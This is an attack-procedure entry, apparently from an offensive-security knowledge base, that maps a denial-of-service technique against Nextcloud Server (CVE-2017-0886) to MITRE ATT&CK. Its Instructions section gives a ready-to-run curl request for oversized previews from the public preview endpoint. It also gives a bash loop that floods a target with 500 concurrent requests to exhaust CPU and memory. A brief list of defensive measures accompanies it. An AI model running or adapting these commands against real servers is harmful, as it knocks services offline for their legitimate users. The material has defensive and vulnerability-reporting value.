---
id: proc-nextcloud-dos-2017
tags:
  - dos
  - nextcloud
  - uncontrolled-resource-consumption
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:37.543Z'
skill_level: intermediate
impact_level: low
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Trigger-DoS-via-Uncontrolled-Resource-Consumption-in-Nextcloud

## Summary

This procedure exploits an uncontrolled resource consumption vulnerability in Nextcloud Server (CVE-2017-0886) to cause denial of service by exhausting server CPU or memory through crafted requests to resource-intensive features like file processing or previews.

## Description

Nextcloud Server suffers from a flaw where certain endpoints, such as file preview generation or search operations, do not properly limit resource usage, allowing attackers to trigger high consumption with minimal requests. This leads to server slowdown or crashes, impacting availability. The attack is web-based, requires no authentication for public endpoints, and can be amplified if chained with enumeration to target specific files. Outcomes include temporary DoS, with recovery possible upon request cessation. Prerequisites: reachable Nextcloud instance and ability to send concurrent requests.

## Requirements

1. Network access to the Nextcloud server.
2. Identification of vulnerable endpoints (e.g., preview or sharing apps).
3. Capability to generate multiple concurrent HTTP requests.

## Defense

Defensive measures and detection strategies:

- Apply resource limits (e.g., via mod_security or application config) on file processing endpoints.
- Use web application firewalls to detect and block anomalous request patterns.
- Monitor server metrics for sudden spikes in CPU/memory correlated with specific endpoints.

## Objectives

1. Exhaust server resources to deny service to legitimate users.
2. Disrupt file hosting operations in Nextcloud.
3. Demonstrate vulnerability for reporting or patching.

## Instructions

### Step 1: Identify Resource-Intensive Endpoints

**Context**: Pinpoint features in Nextcloud that consume disproportionate resources, such as AJAX previews or file sharing publics.

Review Nextcloud documentation or inspect network traffic to find endpoints like `/index.php/apps/files_sharing/ajax/publicpreview.php`.

### Step 2: Craft Single Exploitative Request

**Context**: Test a single request to confirm resource impact, measuring response time or server load.

Send a request to generate a large preview or process a file:

```bash
curl "https://target-nextcloud.com/index.php/apps/files_sharing/ajax/publicpreview.php?x=4096&y=4096&a=1&mode=scale&file=example.jpg&token=abc"
```

> Expect delayed response or high server utilization; use tools like top or htop on the server side if accessible to verify.

### Step 3: Flood with Concurrent Requests

**Context**: Amplify the impact by sending multiple simultaneous requests to overwhelm resources.

Launch parallel requests to the endpoint:

```bash
for i in {1..500}; do
  curl "https://target-nextcloud.com/index.php/apps/files_sharing/ajax/publicpreview.php?x=4096&y=4096&file=largefile.jpg" &

done
wait
```

> Server should exhibit signs of DoS, such as timeouts or errors for other requests.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- dos
- nextcloud
- uncontrolled-resource-consumption
